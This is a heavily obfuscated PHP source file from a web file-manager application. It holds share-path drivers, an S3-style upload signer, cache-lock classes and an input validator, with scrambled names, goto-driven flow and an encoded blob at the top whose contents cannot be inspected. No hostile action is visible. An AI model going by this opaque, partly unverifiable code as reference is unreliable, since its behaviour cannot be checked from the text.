\200\235\151\122\33\47\104\200\336\146\341\365\201\207\324\244\133\354\262\35\177\215\200\120\241\170\365\214\364\275\14\67\116\161\23\335\160\47\52\303\111\36\360\143\272\141\44\173\32\115\54\346".strrev(''."\r".'*°@½üÒé¡Âzú’«ùîå*´¿X|G\'ŸRUh±¢×û«‚}:4Jü¼zg Jóòï')."\336\373\103\255\127\372\306\44\116\12\364\241\132\172\202\101\252\144\126\135\213\200\167\65\257\11\272\356\342\207\263\245\234\106\317\72\155\12\60\364\54\73\52\323\151\2\231\77\333\135\13\141\245\300\116\302".base64_decode('hOKsRxLikBv0DVQWKFVtPwQpAd7Th0hhEerWET64zaY/E4VR40SFH36557JcAgpwNHEQExIIUlw=')."\x83\x11\x80\x28\xa8\xda\x2e\x61\x6c\x9d\x29\xac\xe8\xd5\xd7\x78\x8\xc2\x3b\x4\xd6\x7b\x15\x75\xeb\x30\xac\x25\x85\xe3\x5d\xcc\xa7\x2c\x1c\x4a\xd4\xb4\xc0\x61\x1b\x3\x4b\xc7\xb4\x98\x9c\x25\x7c\x5\x4a\x25\x3c\xd6\x35\x21".base64_decode('hsWzk07GVkw5S+/S7axYuDyGvfR/XpUg5n3CAAA='), 10, -8))); goto e™Ïà¨¿çù; F°˜·äã¶Ê: class PathDriverDriverShareItem { public function __construct($cêÚ¿š„°‰) { $this->pathParse = $cêÚ¿š„°‰; } public function __call($Eéñ„ÔƒËÕ, $D…İœŒ„×õ) { $cíÄ†ÓáÖ =& $_SERVER[õëù©û]; if (method_exists($this, $Eéñ„ÔƒËÕ)) { return; } $FĞÆƒÏˆÎ» = call_user_func_array(array($cíÄ†ÓáÖ[1108], $Eéñ„ÔƒËÕ), $D…İœŒ„×õ); $F¥ÕÉ¯’ = array($cíÄ†ÓáÖ[1109], $cíÄ†ÓáÖ[1110], $cíÄ†ÓáÖ[1111], $cíÄ†ÓáÖ[1112], $cíÄ†ÓáÖ[485], $cíÄ†ÓáÖ[487], $cíÄ†ÓáÖ[1113], $cíÄ†ÓáÖ[102], $cíÄ†ÓáÖ[1114], $cíÄ†ÓáÖ[1115]); if (in_array($Eéñ„ÔƒËÕ, $F¥ÕÉ¯’)) { $FĞÆƒÏˆÎ» = $this->getPathOuter($FĞÆƒÏˆÎ»); } return $FĞÆƒÏˆÎ»; } public function copy($D¶Ú¦Œæ”¹, $d×’ÉïØŒº, $A¿Ï„É¨äÂ = false) { return $this->copyMove($D¶Ú¦Œæ”¹, $d×’ÉïØŒº, $A¿Ï„É¨äÂ, $_SERVER[õëù©û][485]); } public function move($F£õ«¦“¡, $cÃØçĞ½Ö, $d•ËÚ†‹®° = false) { return $this->copyMove($F£õ«¦“¡, $cÃØçĞ½Ö, $d•ËÚ†‹®°, $_SERVER[õëù©û][487]); } private function copyMove($EÄÖ÷°¹„, $f”šâÜ­ö, $B±ñÒÒ–ó‰, $E²¬Ï‘Â¸) { goto CÎÎË‚ä»…; DŞ‚°†ŠŞØ: if ($aÅŸ÷©¸õè->pathParse[$BˆÆ¯İÈö²[989]]) { $f”šâÜ­ö = $aÅŸ÷©¸õè->pathParse[$BˆÆ¯İÈö²[989]]; } else { $f”šâÜ­ö = $c¡Š§«Ú¿; } $fšÔõ“¢³ = IO::copyMove($EÄÖ÷°¹„, $f”šâÜ­ö, $B±ñÒÒ–ó‰, $E²¬Ï‘Â¸); $fšÔõ“¢³ = $this->getPathOuter($fšÔõ“¢³); goto F–µ—ÒÍ; F–µ—ÒÍ: return $fšÔõ“¢³; goto Aã­„¤Ş¿; CÎÎË‚ä»…: $BˆÆ¯İÈö² =& $_SERVER[õëù©û]; $c¡Š§«Ú¿ = $f”šâÜ­ö; $aÅŸ÷©¸õè = IO::driverMake($f”šâÜ­ö); goto DŞ‚°†ŠŞØ; Aã­„¤Ş¿: } public function pathFather($fóŞµ§ßÌ) { return get_path_father($this->pathParse[$_SERVER[õëù©û][75]]); } public function iconvSystem($Eë£¸ğØæ) { return $Eë£¸ğØæ; } protected function infoParse($f‡½Ñù®Ô‡) { $Fó£‚‰»²µ =& $_SERVER[õëù©û]; $b˜³ó…‹ = $this->pathParse[$Fó£‚‰»²µ[434]][$Fó£‚‰»²µ[1009]] . $this->pathParse[$Fó£‚‰»²µ[1002]]; $D„œŞĞîÖ = IO::info($b˜³ó…‹); $F‚ãÒç´ã = $this->pathParse[$Fó£‚‰»²µ[434]]; return Action($Fó£‚‰»²µ[1107])->_shareItemeParse($D„œŞĞîÖ, $F‚ãÒç´ã); } public function listAll($cæ™‘Êö) { $a¯©Šì¶® =& $_SERVER[õëù©û]; $EŒé¾™Ø¯Ò = IO::listAll($cæ™‘Êö); $Añçİäââ = $this->pathParse[$a¯©Šì¶®[434]]; foreach ($EŒé¾™Ø¯Ò as &$d³²ÂÏŒí) { check_abort(); $d³²ÂÏŒí = array_merge(IO::info($d³²ÂÏŒí[$a¯©Šì¶®[75]]), $d³²ÂÏŒí); $d³²ÂÏŒí[$a¯©Šì¶®[387]] = Action($a¯©Šì¶®[1107])->_shareItemeParse($d³²ÂÏŒí, $Añçİäââ); } return $EŒé¾™Ø¯Ò; } public function getPathOuter($fó·êñÓé) { goto CÓ†¬ì×¼; CÓ†¬ì×¼: $B³é¼®—Ä =& $_SERVER[õëù©û]; $FÃî‰å‚ÛÛ = KodIO::parse($fó·êñÓé); if ($FÃî‰å‚ÛÛ[$B³é¼®—Ä[29]] == KodIO::KOD_SHARE_ITEM) { return $FÃî‰å‚ÛÛ[$B³é¼®—Ä[75]]; } goto Dê¼½­ïØĞ; d‚ºÌ„Ú¿ì: if (substr($a¾ì†¢—”Ò, 0, strlen($eÔÌ¹”îŒˆ)) != $eÔÌ¹”îŒˆ) { return !1; } return $this->pathParse[$B³é¼®—Ä[1003]] . $B³é¼®—Ä[8] . ltrim($B®®‚†ßµ, $B³é¼®—Ä[8]); goto c¸Ã²°¿•ò; Dê¼½­ïØĞ: $a¾ì†¢—”Ò = KodIO::clear($fó·êñÓé); $eÔÌ¹”îŒˆ = KodIO::clear($this->pathParse[$B³é¼®—Ä[434]][$B³é¼®—Ä[1009]]); $B®®‚†ßµ = substr($a¾ì†¢—”Ò, strlen($eÔÌ¹”îŒˆ)); goto d‚ºÌ„Ú¿ì; c¸Ã²°¿•ò: } public function getType() { $dÕ¯Î–Û‘á =& $_SERVER[õëù©û]; $eÆ­ˆğÌ‡â = str_replace($dÕ¯Î–Û‘á[71], $dÕ¯Î–Û‘á[33], get_class($this)); return strtolower($eÆ­ˆğÌ‡â); } public function isTypeObject($E¦ğÕ‰˜) { return IO::isTypeObject($E¦ğÕ‰˜); } public function info($c“¢Œáˆ°«) { return $this->infoParse($c“¢Œáˆ°«); } public function infoAuth($D…Õî˜òÑ) { return $this->infoParse($D…Õî˜òÑ); } public function infoWithChildren($cº¨•â¿­“) { return $this->infoParse($cº¨•â¿­“); } public function infoFull($dĞœàëƒ·¢) { return $this->infoParse($dĞœàëƒ·¢); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($eÄ¦³è¥¬Ç) { $this->pathParse = $eÄ¦³è¥¬Ç; } protected function infoParse($aÖÂ³ªƒµÚ) { $c¡ô»È–Õ§ =& $_SERVER[õëù©û]; return Action($c¡ô»È–Õ§[1008])->sharePathInfo($this->pathParse[$c¡ô»È–Õ§[75]], !0); } public function listPath($Dî÷›ÕÂ¬, $d‰šåæ‹µô = false) { $a •ÃçØ =& $_SERVER[õëù©û]; $AšŸò¤åÛ = IO::listPath($Dî÷›ÕÂ¬, $d‰šåæ‹µô); foreach ($AšŸò¤åÛ as $d¼“Ñ¤Š¢ã => $B¹ÜØ…Í„È) { if (!in_array($d¼“Ñ¤Š¢ã, array($a •ÃçØ[73], $a •ÃçØ[74]))) { continue; } foreach ($B¹ÜØ…Í„È as $FÑº‘„Ü” => $fÏÙ¸¬©¼œ) { $fÏÙ¸¬©¼œ = Action($a •ÃçØ[1116])->parsePathChildren($fÏÙ¸¬©¼œ, array($a •ÃçØ[383] => $Dî÷›ÕÂ¬)); $AšŸò¤åÛ[$d¼“Ñ¤Š¢ã][$FÑº‘„Ü”] = Action($a •ÃçØ[1008])->shareItemInfo($fÏÙ¸¬©¼œ); } } return $AšŸò¤åÛ; } public function listAll($E¬›ŠùÇÊÙ) { $AÚÚ½Ì¶òÌ =& $_SERVER[õëù©û]; $e¤Î†‚¢Í© = IO::listAll($E¬›ŠùÇÊÙ); foreach ($e¤Î†‚¢Í© as &$cğ©İè½) { $cğ©İè½ = array_merge(IO::info($cğ©İè½[$AÚÚ½Ì¶òÌ[75]]), $cğ©İè½); $cğ©İè½[$AÚÚ½Ì¶òÌ[387]] = Action($AÚÚ½Ì¶òÌ[1008])->shareItemInfo($cğ©İè½); } return $e¤Î†‚¢Í©; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($b¡Œç¹§§) { parent::__construct($b¡Œç¹§§); $this->signatureVersion($_SERVER[õëù©û][196]); } public function uploadFormData($b¼ëÌë²ö‰, $f¥¤ç®Ë‡á = 3600) { goto eÕ§å¢Ñëõ; c…×ŒíÅ µ: $B’¡¿Ò‹‚ì = array($this->accessKey, $dÏÊ£ã˜Ô“, $this->region, $açÉï½ –…, $DãÆÅÈˆ); $d×¿âÍ¾ó = implode($dØ˜ÏÛÄ[8], $B’¡¿Ò‹‚ì); $BˆâÇ¦İÆ = array($dØ˜ÏÛÄ[1086] => gmdate($dØ˜ÏÛÄ[1085], strtotime($dØ˜ÏÛÄ[1120])), $dØ˜ÏÛÄ[1087] => array(array($dØ˜ÏÛÄ[1089] => $this->bucket), array($dØ˜ÏÛÄ[1088] => $E–´°‹ˆğÌ), array($dØ˜ÏÛÄ[1090], $dØ˜ÏÛÄ[1091], $dØ˜ÏÛÄ[33]), array($dØ˜ÏÛÄ[1090], $dØ˜ÏÛÄ[1121], $dØ˜ÏÛÄ[33]), array($dØ˜ÏÛÄ[1090], $dØ˜ÏÛÄ[1122], $dØ˜ÏÛÄ[33]), array($dØ˜ÏÛÄ[1092] => $fŸ¡ŞË¯), array($dØ˜ÏÛÄ[1123] => $d×¿âÍ¾ó), array($dØ˜ÏÛÄ[1124] => $bØ™ÂÕ©ø¦), array($dØ˜ÏÛÄ[1125] => $eæÙ‡œƒ¬), array($dØ˜ÏÛÄ[1126] => $FîË¢ŒŸ¿))); goto aÁ´‡³ÈÍç; aÄ¯¨…‡Š½: $B©‰¿“Š‹ = hash_hmac($dØ˜ÏÛÄ[1127], $açÉï½ –…, $D¥Á®‡Æ‡¢, !0); $aæÓõ²Ôİ¡ = hash_hmac($dØ˜ÏÛÄ[1127], $DãÆÅÈˆ, $B©‰¿“Š‹, !0); $b–¼ñØÏ‹ = hash_hmac($dØ˜ÏÛÄ[1127], $AãÅ¡÷ŞãÎ, $aæÓõ²Ôİ¡); goto a…Ú‰Ù±×­; aÒóù¤™ù…: $açÉï½ –… = $dØ˜ÏÛÄ[59]; $eæÙ‡œƒ¬ = gmdate($dØ˜ÏÛÄ[1118]); $dÏÊ£ã˜Ô“ = gmdate($dØ˜ÏÛÄ[685]); goto d’¦¼©„¢ƒ; a…Ú‰Ù±×­: $E·å¤©Ì– = array($dØ˜ÏÛÄ[195] => $dØ˜ÏÛÄ[33], $dØ˜ÏÛÄ[1129] => $dØ˜ÏÛÄ[33], $dØ˜ÏÛÄ[1088] => $E–´°‹ˆğÌ, $dØ˜ÏÛÄ[1092] => $fŸ¡ŞË¯, $dØ˜ÏÛÄ[1096] => $AãÅ¡÷ŞãÎ, $dØ˜ÏÛÄ[1130] => $d×¿âÍ¾ó, $dØ˜ÏÛÄ[1131] => $bØ™ÂÕ©ø¦, $dØ˜ÏÛÄ[1132] => $eæÙ‡œƒ¬, $dØ˜ÏÛÄ[1133] => $FîË¢ŒŸ¿, $dØ˜ÏÛÄ[1134] => $b–¼ñØÏ‹, $dØ˜ÏÛÄ[165] => $this->getHost()); return $E·å¤©Ì–; goto D–â˜Î³ó…; d’¦¼©„¢ƒ: $DãÆÅÈˆ = $dØ˜ÏÛÄ[1119]; $FîË¢ŒŸ¿ = $f¥¤ç®Ë‡á . $dØ˜ÏÛÄ[33]; $fŸ¡ŞË¯ = $dØ˜ÏÛÄ[1084]; goto c…×ŒíÅ µ; eÕ§å¢Ñëõ: $dØ˜ÏÛÄ =& $_SERVER[õëù©û]; $E–´°‹ˆğÌ = $dØ˜ÏÛÄ[181]; $bØ™ÂÕ©ø¦ = $dØ˜ÏÛÄ[1117]; goto aÒóù¤™ù…; aÁ´‡³ÈÍç: $AãÅ¡÷ŞãÎ = base64_encode(json_encode($BˆâÇ¦İÆ)); $C³†¥í· = hash_hmac($dØ˜ÏÛÄ[1127], $dÏÊ£ã˜Ô“, $dØ˜ÏÛÄ[1128] . $this->secret, !0); $D¥Á®‡Æ‡¢ = hash_hmac($dØ˜ÏÛÄ[1127], $this->region, $C³†¥í·, !0); goto aÄ¯¨…‡Š½; D–â˜Î³ó…: } } goto f¼§¼õì…‡; cÂ…¶ Ÿø: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $BŒ¾Éß„Ç÷ =& $_SERVER[õëù©û]; $A¥ëöóï ÷ = $GLOBALS[$BŒ¾Éß„Ç÷[6]][$BŒ¾Éß„Ç÷[333]]; self::$cachePath = $A¥ëöóï ÷[$BŒ¾Éß„Ç÷[163]][$BŒ¾Éß„Ç÷[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($eöÖóÇáî, $Eéƒ¶èàšÔ = 0) { goto BÉÚ’Û‡ÎÔ; BÉÚ’Û‡ÎÔ: $c‡­¨®™É =& $_SERVER[õëù©û]; $C‡ŠÛñ…¼ = microtime(!0); $e‡ÄÍ÷çô¬ = $C‡ŠÛñ…¼ + $Eéƒ¶èàšÔ + 0.0001; goto e¨êã¦ãÌ; e¨êã¦ãÌ: $C¸­íÌ‰œ¢ = rtrim(self::$cachePath, $c‡­¨®™É[8]) . $c‡­¨®™É[767] . md5($eöÖóÇáî) . $c‡­¨®™É[768]; if (file_exists($C¸­íÌ‰œ¢) && filemtime($C¸­íÌ‰œ¢) && filemtime($C¸­íÌ‰œ¢) < time() - 10) { @unlink($C¸­íÌ‰œ¢); } do { if (file_exists($C¸­íÌ‰œ¢)) { cacheLockWait(); continue; } $f•ã£ã­å = fopen($C¸­íÌ‰œ¢, $c‡­¨®™É[769]); if (!$f•ã£ã­å) { return !1; } $bŒ’ó±‹×ø = flock($f•ã£ã­å, LOCK_EX | LOCK_NB); self::$caches[$eöÖóÇáî] = array($c‡­¨®™É[770] => $f•ã£ã­å, $c‡­¨®™É[163] => $C¸­íÌ‰œ¢); fwrite($f•ã£ã­å, $e‡ÄÍ÷çô¬); clearstatcache(); if ($f•ã£ã­å && $bŒ’ó±‹×ø) { return !0; } cacheLockWait(); } while (microtime(!0) < $e‡ÄÍ÷çô¬); goto E¢ˆ‘ê«Ü…; E¢ˆ‘ê«Ü…: $this->unlock($eöÖóÇáî); return !1; goto c•ÚêÀÙ‰ì; c•ÚêÀÙ‰ì: } public function lockGet($BÏ¼õ£‡Õ«) { $aÎË„‚’º =& $_SERVER[õëù©û]; $dÜÊÓŒö¶ = rtrim(self::$cachePath, $aÎË„‚’º[8]) . $aÎË„‚’º[767] . md5($BÏ¼õ£‡Õ«) . $aÎË„‚’º[768]; return file_exists($dÜÊÓŒö¶); } public function unlock($AÂàáÉª) { goto f§Ó”íğ“ø; D²’¨“ƒ: unset(self::$caches[$AÂàáÉª]); goto aĞºŞí¦„·; f§Ó”íğ“ø: $eÜßÏ¶ÍÛ =& $_SERVER[õëù©û]; $aº‹Ûˆ¡º¤ = self::$caches[$AÂàáÉª]; if (!$aº‹Ûˆ¡º¤) { return; } goto f–å‚öø; f–å‚öø: @flock($aº‹Ûˆ¡º¤[$eÜßÏ¶ÍÛ[770]], LOCK_UN); @fclose($aº‹Ûˆ¡º¤[$eÜßÏ¶ÍÛ[770]]); @unlink($aº‹Ûˆ¡º¤[$eÜßÏ¶ÍÛ[163]]); goto D²’¨“ƒ; aĞºŞí¦„·: } } class CacheLockRedis { public function lock($e”äêÄƒ§í, $F²»ÌÈË = 10) { $AÕ‰Àéó… = Cache::init(); $EçÒâ×•Œä = microtime(!0) + $F²»ÌÈË; while (microtime(!0) < $EçÒâ×•Œä) { $fÊäˆ…ğ•§ = $AÕ‰Àéó…->get($e”äêÄƒ§í); if (!$fÊäˆ…ğ•§) { $cœˆ‰¦îÍ‚ = $AÕ‰Àéó…->setLock($e”äêÄƒ§í, $EçÒâ×•Œä, $F²»ÌÈË); if ($cœˆ‰¦îÍ‚) { return !0; } } else { if ($fÊäˆ…ğ•§ < microtime(!0)) { $AÕ‰Àéó…->set($e”äêÄƒ§í, $EçÒâ×•Œä, $EçÒâ×•Œä); if ($AÕ‰Àéó…->get($e”äêÄƒ§í) === $fÊäˆ…ğ•§) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($C§áö‹ŸŠö) { return Cache::init()->get($C§áö‹ŸŠö); } public function unlock($DŠñğ¦‚ë¯) { return Cache::init()->remove($DŠñğ¦‚ë¯); } } class CacheLockMemcached { public function lock($EàŒõ½Ë¿¥, $a‚êßÏ‰î— = 0) { $C»Äà¨„šÖ = Cache::init(); $bÍÍÁœ¸ˆÛ = microtime(!0) + $a‚êßÏ‰î—; while (microtime(!0) < $bÍÍÁœ¸ˆÛ) { $E÷ŠºÅ´Ùí = $C»Äà¨„šÖ->get($EàŒõ½Ë¿¥); if (!$E÷ŠºÅ´Ùí || $E÷ŠºÅ´Ùí < microtime(!0)) { $bÇØÈŠÎÆ = $C»Äà¨„šÖ->handle->add($EàŒõ½Ë¿¥, $bÍÍÁœ¸ˆÛ, $a‚êßÏ‰î—); if ($bÇØÈŠÎÆ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($DÅë‡±…¸) { return Cache::init()->get($DÅë‡±…¸); } public function unlock($fß«¸¥‡ñ) { return Cache::init()->remove($fß«¸¥‡ñ); } } goto f¿ºãµ††à; fè¡’§¯„: if (!function_exists($_SERVER[õëù©û][1840])) { function imagecreatefrombmp($AÙÌ×Ş¿œÓ) { return ImageGdBMP::load($AÙÌ×Ş¿œÓ); } } class Input { public static function getArray($f•óÊ¼Œ¶) { goto cè·ëåì¿‘; cè·ëåì¿‘: $c¾ùëŒË³Á =& $_SERVER[õëù©û]; global $in; $cô›¹Ó×ç¤ = array(); goto cêÅ¬™–š¸; cêÅ¬™–š¸: $cŸµŞŸ”¹† = array(); $bØ³ô²ßÜ = LNG($c¾ùëŒË³Á[1841]); foreach ($f•óÊ¼Œ¶ as $bÆ¤˜¡¾‰¬ => $AÙ¸š¯æÚ–) { goto B¥¥½‚½…¤; d„ïÏ¢Öí†: if (!array_key_exists($bÆ¤˜¡¾‰¬, $in)) { if (array_key_exists($c¾ùëŒË³Á[1843], $AÙ¸š¯æÚ–)) { if (!is_null($AÙ¸š¯æÚ–[$c¾ùëŒË³Á[1843]])) { $cô›¹Ó×ç¤[$AŠ§ƒ˜§Ö„] = $AÙ¸š¯æÚ–[$c¾ùëŒË³Á[1843]]; } } else { if (isset($AÙ¸š¯æÚ–[$c¾ùëŒË³Á[1844]])) { $cŸµŞŸ”¹†[] = $fĞÔŒ„åÅ; } } continue; } if (isset($AÙ¸š¯æÚ–[$c¾ùëŒË³Á[1844]]) && $AÙ¸š¯æÚ–[$c¾ùëŒË³Á[1844]] == $c¾ùëŒË³Á[278]) { $eÈëìß‡ˆè = json_decode($in[$bÆ¤˜¡¾‰¬], !0); if (is_array($eÈëìß‡ˆè)) { $cô›¹Ó×ç¤[$AŠ§ƒ˜§Ö„] = $eÈëìß‡ˆè; } else { if (array_key_exists($c¾ùëŒË³Á[1843], $AÙ¸š¯æÚ–)) { if (!is_null($AÙ¸š¯æÚ–[$c¾ùëŒË³Á[1843]])) { $cô›¹Ó×ç¤[$AŠ§ƒ˜§Ö„] = $AÙ¸š¯æÚ–[$c¾ùëŒË³Á[1843]]; } } else { $cŸµŞŸ”¹†[] = $fĞÔŒ„åÅ; } } continue; } $fÆ—›Š“„Ó = _get($AÙ¸š¯æÚ–, $c¾ùëŒË³Á[1002]); goto cÊ™ïÙ…“¹; B¥¥½‚½…¤: $fĞÔŒ„åÅ = _get($AÙ¸š¯æÚ–, $c¾ùëŒË³Á[1229], $bØ³ô²ßÜ . $c¾ùëŒË³Á[873] . $bÆ¤˜¡¾‰¬); $AŠ§ƒ˜§Ö„ = $bÆ¤˜¡¾‰¬; if (isset($AÙ¸š¯æÚ–[$c¾ùëŒË³Á[1842]]) && $AÙ¸š¯æÚ–[$c¾ùëŒË³Á[1842]]) { $AŠ§ƒ˜§Ö„ = $AÙ¸š¯æÚ–[$c¾ùëŒË³Á[1842]]; } goto d„ïÏ¢Öí†; cÊ™ïÙ…“¹: if (isset($AÙ¸š¯æÚ–[$c¾ùëŒË³Á[1844]]) && !self::check($in[$bÆ¤˜¡¾‰¬], $AÙ¸š¯æÚ–[$c¾ùëŒË³Á[1844]], $fÆ—›Š“„Ó)) { if (array_key_exists($c¾ùëŒË³Á[1843], $AÙ¸š¯æÚ–)) { if (!is_null($AÙ¸š¯æÚ–[$c¾ùëŒË³Á[1843]])) { $cô›¹Ó×ç¤[$AŠ§ƒ˜§Ö„] = $AÙ¸š¯æÚ–[$c¾ùëŒË³Á[1843]]; } } else { $cŸµŞŸ”¹†[] = $fĞÔŒ„åÅ; } continue; } $cô›¹Ó×ç¤[$AŠ§ƒ˜§Ö„] = $in[$bÆ¤˜¡¾‰¬]; goto E¶íê ²Ò; E¶íê ²Ò: } goto b©ñ•øÈâ; b©ñ•øÈâ: if (count($cŸµŞŸ”¹†) > 0) { show_json(implode($c¾ùëŒË³Á[1845], $cŸµŞŸ”¹†), !1); } return $cô›¹Ó×ç¤; goto B¨òíƒßÑ×; B¨òíƒßÑ×: } public static function reg($eõíî‚·œ = "\x72\145\161\165\x69\162\x65") { static $E’×¼¾ù‡ó = array("\x72\x65\x71\165\x69\162\145" => "\56\53", "\156\165\x6d\142\145\x72" => "\134\144\x2b", "\150\x65\170" => "\133\60\x2d\x39\101\x2d\106\141\x2d\146\135\x2b", "\x69\x6e\x74" => "\x5b\55\134\x2b\x5d\77\134\144\53", "\x62\157\157\x6c" => "\60\174\61", "\146\x6c\157\141\164" => "\133\x2d\134\x2b\x5d\77\134\144\53\50\x5c\x2e\x5c\144\53\51\77", "\x65\x6e\147\154\151\163\150" => "\133\101\x2d\132\141\55\x7a\40\x5d\53", "\143\150\151\156\x65\163\145" => "\x5b\x5c\170\x7b\x34\145\60\x30\x7d\55\x5c\x78\173\71\146\x61\65\175\135\x2b", "\150\141\163\x43\150\x69\156\x65\x73\145" => "\x2f\50\133\x5c\x78\173\x34\145\60\x30\175\x2d\x5c\170\x7b\x39\x66\x61\x35\x7d\x5d\53\x29\57\165", "\x65\x6d\141\151\154" => "\134\167\x2b\50\133\x5c\56\x5c\55\x5d\x5c\167\53\51\52\134\x40\134\167\x2b\x28\133\134\x2e\134\x2d\x5d\x5c\167\x2b\51\52\134\56\134\167\53", "\160\x68\x6f\x6e\x65" => "\x31\133\63\55\71\x5d\x5c\x64\173\71\x7d", "\164\x65\x6c\x70\x68\x6f\156\145" => "\x28\x5c\x28\134\x64\173\63\x2c\x34\175\x5c\51\x7c\x5c\x64\173\x33\x2c\64\175\55\x7c\134\x73\51\77\x5c\144\x7b\x37\54\61\x34\x7d", "\165\162\x6c" => "\x28\150\164\x74\x70\174\146\164\160\x7c\150\x74\x74\160\163\51\72\x5c\57\134\x2f\x5b\134\x77\x5c\x2d\x5f\135\x2b\50\134\x2e\x5b\134\167\x5c\x2d\137\x5d\53\x29\x2b\50\x5b\x5c\x77\134\55\134\x2e\x2c\x40\x3f\x5e\75\45\x26\72\x5c\x2f\176\x5c\x2b\x23\135\x2a\133\x5c\167\x5c\55\134\100\77\x5e\x3d\x25\x26\134\57\176\134\53\43\x5d\x29\x3f", "\165\x72\154\x46\165\154\x6c" => "\x5b\x61\x2d\x7a\101\x2d\172\135\53\x3a\x5c\57\x5c\x2f\133\136\134\x73\x5d\x2a", "\151\x70" => "\50\134\x64\x7b\x31\54\63\x7d\x5c\56\x29\173\63\175\x28\134\144\173\x31\54\x33\x7d\x29", "\172\151\x70" => "\x5b\x31\x2d\71\x5d\x5c\x64\173\x35\x7d\50\77\41\x5c\144\x29", "\x69\x64\103\141\162\x64" => "\50\x5c\x64\173\x31\x35\x7d\x29\x7c\50\134\144\173\x31\x37\175\50\134\144\x7c\x58\174\x78\x29\x29", "\x63\157\154\157\x72" => "\43\50\x5b\60\55\x39\x41\55\106\x61\x2d\x66\135\x7b\63\175\x7c\x5b\x30\x2d\71\101\x2d\x46\141\x2d\x66\x5d\173\x36\175\x29", "\164\151\155\x65" => "\50\133\60\x2d\61\135\x5c\x64\174\62\133\60\x2d\64\x5d\51\x3a\x5b\60\x2d\65\x5d\134\x64", "\x64\141\x74\x65" => "\x5c\x64\x7b\x34\x7d\133\x2d\x5c\x2f\x5d\77\x28\x30\133\x31\55\x39\x5d\174\61\133\x30\55\62\135\51\133\x2d\x5c\57\135\x3f\x28\133\60\x2d\62\135\134\144\x7c\63\x5b\60\x2d\x31\x5d\51", "\144\x61\164\145\x54\151\x6d\145" => "\134\144\173\64\175\x5b\x2d\x5c\x2f\135\77\50\60\x5b\x31\x2d\x39\x5d\174\61\x5b\x30\55\x32\135\51\x5b\55\134\x2f\x5d\77\x28\x5b\60\55\x32\x5d\x5c\144\174\63\133\x30\55\x31\x5d\51\x5c\x73\53\x28\x5b\x30\55\x31\x5d\x5c\144\x7c\62\x5b\60\55\64\x5d\x29\72\133\60\55\x35\135\x5c\144", "\160\x61\x73\163\167\x6f\x72\x64" => "\50\x3f\x3d\56\x2a\134\x64\51\50\x3f\75\x2e\x2a\x5b\x61\x2d\x7a\x5d\51\x28\x3f\x3d\56\x2a\x5b\101\55\132\x5d\51\x2e\x7b\x38\x2c\62\60\x7d", "\x6b\145\x79" => "\x5b\101\55\132\141\55\172\x30\55\x39\x5f\134\55\x5c\56\x5d\53", "\153\145\x79\106\165\x6c\154" => "\x5b\101\x2d\x5a\141\55\172\60\x2d\x39\137\134\x2d\134\x2e\134\x73\54\x5d\53"); if (!$eõíî‚·œ) { return $E’×¼¾ù‡ó; } return $E’×¼¾ù‡ó[$eõíî‚·œ]; } public static function check($dÇÓº‚ìŞ, $Eçé®¨›š¡, $Bœ‹‡ø©êÉ = null) { $føÓÀ±’ğ =& $_SERVER[õëù©û]; switch ($Eçé®¨›š¡) { case $føÓÀ±’ğ[7]: return in_array($dÇÓº‚ìŞ, $Bœ‹‡ø©êÉ); break; case $føÓÀ±’ğ[1846]: return floatval($dÇÓº‚ìŞ) > $Bœ‹‡ø©êÉ; break; case $føÓÀ±’ğ[1847]: return floatval($dÇÓº‚ìŞ) < $Bœ‹‡ø©êÉ; break; case $føÓÀ±’ğ[321]: return strlen($dÇÓº‚ìŞ) >= $Bœ‹‡ø©êÉ[0] && strlen($dÇÓº‚ìŞ) <= $Bœ‹‡ø©êÉ[1]; break; case $føÓÀ±’ğ[321]: if (is_array($Bœ‹‡ø©êÉ)) { return strlen($dÇÓº‚ìŞ) >= $Bœ‹‡ø©êÉ[0] && strlen($dÇÓº‚ìŞ) <= $Bœ‹‡ø©êÉ[1]; break; } else { return strlen($dÇÓº‚ìŞ) == $Bœ‹‡ø©êÉ; break; } case $føÓÀ±’ğ[317]: return floatval($dÇÓº‚ìŞ) >= $Bœ‹‡ø©êÉ[0] && floatval($dÇÓº‚ìŞ) <= $Bœ‹‡ø©êÉ[1]; break; } $Cºƒœ­åá™ = self::reg(!1); $Eçé®¨›š¡ = isset($Cºƒœ­åá™[$Eçé®¨›š¡]) ? $Cºƒœ­åá™[$Eçé®¨›š¡] : $Eçé®¨›š¡; if (substr($Eçé®¨›š¡, 0, 1) != $føÓÀ±’ğ[8]) { $Eçé®¨›š¡ = $føÓÀ±’ğ[1848] . $Eçé®¨›š¡ . $føÓÀ±’ğ[1849]; } return preg_match($Eçé®¨›š¡, $dÇÓº‚ìŞ) === 1; } public static function get($bœ¤«ï†š±, $a²é÷ê‡°› = null, $B“–øÍø§¯ = null, $føš·Ş¬áÍ = null) { goto Fíµ¨¾Ùñ™; Fíµ¨¾Ùñ™: $c¨ÈÊñ×ôö =& $_SERVER[õëù©û]; $b¥ö‹÷’ëÏ = array(); if (!is_null($B“–øÍø§¯)) { $b¥ö‹÷’ëÏ[$c¨ÈÊñ×ôö[34]] = $B“–øÍø§¯; } goto A£²Ç°Ëİî; A£²Ç°Ëİî: if (!is_null($føš·Ş¬áÍ)) { $b¥ö‹÷’ëÏ[$c¨ÈÊñ×ôö[1002]] = $føš·Ş¬áÍ; } if (!is_null($a²é÷ê‡°›)) { $b¥ö‹÷’ëÏ[$c¨ÈÊñ×ôö[1844]] = $a²é÷ê‡°›; } $Aáˆ‘óÅŞã = Input::getArray(array($bœ¤«ï†š± => $b¥ö‹÷’ëÏ)); goto BÙ¯Å÷ñ¸Œ; BÙ¯Å÷ñ¸Œ: return $Aáˆ‘óÅŞã[$bœ¤«ï†š±]; goto AÇó›–¨²; AÇó›–¨²: } } class KodArchive { static function init() { goto Fš‚„ñŠ£; Dâˆíëœ‹: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $fµ¯İğè[1856]; require_once ARCHIVE_LIB . $fµ¯İğè[1857]; goto dœˆŒá–Õ; dœˆŒá–Õ: require_once ARCHIVE_LIB . $fµ¯İğè[1858]; require_once ARCHIVE_LIB . $fµ¯İğè[1859]; require_once ARCHIVE_LIB . $fµ¯İğè[1860]; goto a¸äÄ‘í·; Fš‚„ñŠ£: $fµ¯İğè =& 